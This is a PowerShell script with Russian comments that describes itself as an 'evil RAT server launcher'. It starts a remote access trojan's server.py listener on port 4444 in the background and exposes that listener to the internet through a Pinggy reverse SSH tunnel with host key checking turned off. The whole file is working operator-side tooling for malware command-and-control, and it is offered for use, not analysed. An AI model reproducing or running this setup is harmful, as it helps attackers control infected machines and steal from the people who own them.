# =============================================
#   ЗЛОЙ RAT SERVER LAUNCHER ДЛЯ WINDOWS
#   Запускает server.py + Pinggy TCP туннель
# =============================================

Write-Host "==================================================" -ForegroundColor Red
Write-Host "          ЗЛОЙ RAT SERVER LAUNCHER (Windows)" -ForegroundColor Red
Write-Host "==================================================" -ForegroundColor Red
Write-Host ""

# Убиваем старые процессы
Get-Process | Where-Object { $_.ProcessName -like "*python*" -and $_.CommandLine -like "*server.py*" } | Stop-Process -Force -ErrorAction SilentlyContinue
Get-Process ssh* -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Write-Host "[+] Запускаем локальный сервер ратки..." -ForegroundColor Green

# Запускаем server.py в фоне
Start-Process python -ArgumentList "server.py" -NoNewWindow -RedirectStandardOutput "server.log" -RedirectStandardError "server_error.log"

Start-Sleep -Seconds 3

Write-Host "[+] Сервер запущен. Логи в server.log" -ForegroundColor Green
Write-Host ""

Write-Host "[+] Запускаем Pinggy TCP туннель..." -ForegroundColor Yellow
Write-Host "НЕ ЗАКРЫВАЙ ЭТО ОКНО!" -ForegroundColor Red
Write-Host ""

Write-Host "Pinggy команда:" -ForegroundColor Cyan
Write-Host "ssh -p 443 -R0:127.0.0.1:4444 tcp@a.pinggy.io" -ForegroundColor White
Write-Host ""

# Запускаем Pinggy (OpenSSH должен быть установлен)
ssh -p 443 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -R0:127.0.0.1:4444 tcp@a.pinggy.io

Write-Host ""
Write-Host "[-] Туннель упал. Сервер будет остановлен." -ForegroundColor Red
Get-Process | Where-Object { $_.CommandLine -like "*server.py*" } | Stop-Process -Force -ErrorAction SilentlyContinue
